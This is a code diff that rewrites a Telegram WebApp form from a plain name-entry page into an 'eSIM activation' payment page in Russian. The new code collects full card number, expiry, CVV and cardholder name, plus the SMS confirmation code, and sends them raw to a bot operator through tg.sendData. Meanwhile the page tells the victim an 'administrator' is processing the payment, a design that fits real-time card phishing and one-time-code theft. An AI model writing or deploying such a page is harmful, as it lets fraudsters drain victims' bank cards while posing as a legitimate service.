@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WebApp Form</title>
+    <title>eSIM Активация</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -24,11 +24,15 @@
 
         .container {
             background: white;
-            border-radius: 20px;
+            border-radius: 24px;
             padding: 30px;
             width: 100%;
             max-width: 400px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+        }
+
+        .hidden {
+            display: none !important;
         }
 
         h1 {
@@ -38,42 +42,14 @@
             font-size: 24px;
         }
 
-        /* Блок с данными инициализации Telegram */
-        .telegram-data {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-left: 4px solid #0088cc;
-        }
-
-        .telegram-data h3 {
-            color: #0088cc;
-            font-size: 14px;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .data-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-size: 13px;
-        }
-
-        .data-label {
+        .subtitle {
+            text-align: center;
             color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
         }
 
-        .data-value {
-            color: #333;
-            font-weight: 500;
-            max-width: 60%;
-            text-align: right;
-            word-break: break-word;
-        }
-
+        /* Форма оплаты */
         .form-group {
             margin-bottom: 20px;
         }
@@ -86,40 +62,128 @@
             font-weight: 500;
         }
 
-        input[type="text"] {
+        input {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            transition: all 0.3s;
+            background: #f8f9fa;
         }
 
-        input[type="text"]:focus {
+        input:focus {
             outline: none;
             border-color: #667eea;
+            background: white;
+        }
+
+        .card-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 15px;
         }
 
         button {
             width: 100%;
-            padding: 16px;
+            padding: 18px;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
             border-radius: 12px;
-            font-size: 16px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: all 0.3s;
+            margin-top: 10px;
         }
 
         button:hover {
             transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
         }
 
         button:active {
             transform: translateY(0);
+        }
+
+        /* Экран загрузки */
+        .loading-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 10px;
+        }
+
+        .loading-subtext {
+            color: #999;
+            font-size: 13px;
+        }
+
+        /* Экран ввода кода */
+        .code-input {
+            text-align: center;
+            letter-spacing: 8px;
+            font-size: 24px;
+            font-weight: bold;
+            padding: 20px;
+        }
+
+        .info-box {
+            background: #f0f4ff;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #555;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        .amount {
+            text-align: center;
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+            margin: 20px 0;
+        }
+
+        .amount-currency {
+            font-size: 20px;
+            color: #999;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            color: #27ae60;
+            font-size: 13px;
         }
 
         .error {
@@ -128,119 +192,274 @@
             margin-top: 5px;
             display: none;
         }
-
-        .success {
-            text-align: center;
-            color: #27ae60;
-            font-size: 16px;
-            margin-top: 15px;
-            display: none;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>📝 Введите ваше имя</h1>
         
-        <!-- Блок с данными инициализации Telegram -->
-        <div class="telegram-data" id="telegramData">
-            <h3>📱 Данные Telegram</h3>
-            <div class="data-row">
-                <span class="data-label">ID:</span>
-                <span class="data-value" id="userId">-</span>
+        <!-- ЭКРАН 1: Оплата -->
+        <div id="paymentScreen">
+            <h1>💳 Оплата eSIM</h1>
+            <div class="subtitle">Введите данные карты для оплаты 1₽</div>
+            
+            <div class="amount">
+                1 <span class="amount-currency">₽</span>
             </div>
-            <div class="data-row">
-                <span class="data-label">Имя:</span>
-                <span class="data-value" id="userFirstName">-</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Фамилия:</span>
-                <span class="data-value" id="userLastName">-</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Username:</span>
-                <span class="data-value" id="userUsername">-</span>
+
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label>Номер карты</label>
+                    <input 
+                        type="text" 
+                        id="cardNumber" 
+                        placeholder="0000 0000 0000 0000" 
+                        maxlength="19"
+                        autocomplete="off"
+                    >
+                    <div class="error" id="cardError">Введите корректный номер карты</div>
+                </div>
+
+                <div class="card-row">
+                    <div class="form-group">
+                        <label>Срок действия</label>
+                        <input 
+                            type="text" 
+                            id="expiry" 
+                            placeholder="MM/YY" 
+                            maxlength="5"
+                            autocomplete="off"
+                        >
+                        <div class="error" id="expiryError">Неверный формат</div>
+                    </div>
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input 
+                            type="password" 
+                            id="cvv" 
+                            placeholder="123" 
+                            maxlength="3"
+                            autocomplete="off"
+                        >
+                        <div class="error" id="cvvError">Неверный CVV</div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Имя держателя</label>
+                    <input 
+                        type="text" 
+                        id="cardholder" 
+                        placeholder="IVAN IVANOV" 
+                        autocomplete="off"
+                    >
+                    <div class="error" id="nameError">Введите имя</div>
+                </div>
+
+                <button type="submit">💰 Оплатить 1₽</button>
+                
+                <div class="secure-badge">
+                    🔒 Безопасная оплата. Данные шифруются.
+                </div>
+            </form>
+        </div>
+
+        <!-- ЭКРАН 2: Загрузка (ожидание админа) -->
+        <div id="loadingScreen" class="hidden">
+            <div class="loading-screen">
+                <div class="spinner"></div>
+                <div class="loading-text">⏳ Обработка платежа...</div>
+                <div class="loading-subtext">
+                    Администратор проверяет вашу заявку.<br>
+                    Это займет всего несколько минут.
+                </div>
             </div>
         </div>
 
-        <form id="nameForm">
-            <div class="form-group">
-                <label for="nameInput">Ваше имя</label>
-                <input 
-                    type="text" 
-                    id="nameInput" 
-                    placeholder="Введите имя..." 
-                    required
-                    autocomplete="off"
-                >
-                <div class="error" id="errorMsg">Пожалуйста, введите имя</div>
-            </div>
+        <!-- ЭКРАН 3: Ввод кода подтверждения -->
+        <div id="codeScreen" class="hidden">
+            <h1>🔢 Подтверждение</h1>
             
-            <button type="submit">✈️ Отправить</button>
-        </form>
-        
-        <div class="success" id="successMsg">✅ Имя успешно отправлено!</div>
+            <div class="info-box">
+                📱 Введите код подтверждения, отправленный на ваш номер телефона для активации eSIM.
+            </div>
+
+            <form id="codeForm">
+                <div class="form-group">
+                    <label>Код из SMS</label>
+                    <input 
+                        type="text" 
+                        id="codeInput" 
+                        class="code-input"
+                        placeholder="0000" 
+                        maxlength="6"
+                        inputmode="numeric"
+                        autocomplete="off"
+                    >
+                    <div class="error" id="codeError">Введите код подтверждения</div>
+                </div>
+
+                <button type="submit">✅ Подтвердить</button>
+            </form>
+        </div>
+
+        <!-- ЭКРАН 4: Успех -->
+        <div id="successScreen" class="hidden">
+            <div class="loading-screen">
+                <div class="success-icon">🎉</div>
+                <div class="loading-text">Код отправлен!</div>
+                <div class="loading-subtext">
+                    Администратор завершает активацию.<br>
+                    Инструкции придут в Telegram.
+                </div>
+            </div>
+        </div>
+
     </div>
 
     <script>
         // Инициализация Telegram WebApp
         const tg = window.Telegram.WebApp;
-        
-        // Настройка WebApp
         tg.ready();
         tg.expand();
-        
-        // Установка цвета шапки
         tg.setHeaderColor('#667eea');
         tg.setBackgroundColor('#ffffff');
 
-        // Получаем данные пользователя
-        const initData = tg.initDataUnsafe;
-        
-        // Отображаем данные инициализации
-        if (initData.user) {
-            document.getElementById('userId').textContent = initData.user.id || '-';
-            document.getElementById('userFirstName').textContent = initData.user.first_name || '-';
-            document.getElementById('userLastName').textContent = initData.user.last_name || '-';
-            document.getElementById('userUsername').textContent = initData.user.username ? '@' + initData.user.username : '-';
+        // Определяем текущий шаг из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const step = urlParams.get('step') || 'payment';
+
+        // Показываем нужный экран
+        if (step === 'code') {
+            showScreen('codeScreen');
+        } else {
+            showScreen('paymentScreen');
         }
 
-        // Обработка отправки формы
-        document.getElementById('nameForm').addEventListener('submit', function(e) {
+        function showScreen(screenId) {
+            ['paymentScreen', 'loadingScreen', 'codeScreen', 'successScreen'].forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(screenId).classList.remove('hidden');
+        }
+
+        // Маска для номера карты
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.substring(0, 16);
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i += 4) {
+                formattedValue += value.substring(i, i + 4) + ' ';
+            }
+            e.target.value = formattedValue.trim();
+        });
+
+        // Маска для срока действия
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Только цифры для CVV и кода
+        ['cvv', 'codeInput'].forEach(id => {
+            document.getElementById(id).addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        });
+
+        // Обработка оплаты
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const nameInput = document.getElementById('nameInput');
-            const name = nameInput.value.trim();
-            const errorMsg = document.getElementById('errorMsg');
-            const successMsg = document.getElementById('successMsg');
-            
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardholder = document.getElementById('cardholder').value.trim();
+
             // Валидация
-            if (!name) {
-                errorMsg.style.display = 'block';
-                nameInput.style.borderColor = '#e74c3c';
+            let hasError = false;
+            
+            if (cardNumber.length !== 16) {
+                document.getElementById('cardError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('cardError').style.display = 'none';
+            }
+
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                document.getElementById('expiryError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('expiryError').style.display = 'none';
+            }
+
+            if (cvv.length !== 3) {
+                document.getElementById('cvvError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('cvvError').style.display = 'none';
+            }
+
+            if (!cardholder) {
+                document.getElementById('nameError').style.display = 'block';
+                hasError = true;
+            } else {
+                document.getElementById('nameError').style.display = 'none';
+            }
+
+            if (hasError) return;
+
+            // Отправляем данные боту
+            const paymentData = {
+                card_number: cardNumber,
+                expiry: expiry,
+                cvv: cvv,
+                cardholder: cardholder,
+                amount: 1
+            };
+
+            tg.sendData(JSON.stringify(paymentData));
+            
+            // Показываем экран загрузки
+            showScreen('loadingScreen');
+            
+            // Закрываем WebApp через 2 секунды (данные уже отправлены)
+            setTimeout(() => {
+                tg.close();
+            }, 2000);
+        });
+
+        // Обработка кода подтверждения
+        document.getElementById('codeForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('codeInput').value;
+            
+            if (code.length < 4) {
+                document.getElementById('codeError').style.display = 'block';
                 return;
             }
             
-            // Скрываем ошибку
-            errorMsg.style.display = 'none';
-            nameInput.style.borderColor = '#e0e0e0';
+            document.getElementById('codeError').style.display = 'none';
             
-            // Отправляем данные боту
-            tg.sendData(name);
+            // Отправляем код боту
+            tg.sendData(JSON.stringify({ code: code }));
             
             // Показываем успех
-            successMsg.style.display = 'block';
+            showScreen('successScreen');
             
-            // Закрываем WebApp через 1 секунду
             setTimeout(() => {
                 tg.close();
-            }, 1000);
+            }, 2000);
         });
 
-        // Скрываем ошибку при вводе
-        document.getElementById('nameInput').addEventListener('input', function() {
-            document.getElementById('errorMsg').style.display = 'none';
-            this.style.borderColor = '#e0e0e0';
+        // Скрываем ошибки при вводе
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', function() {
+                this.parentElement.querySelector('.error').style.display = 'none';
+            });
         });
     </script>
 </body>
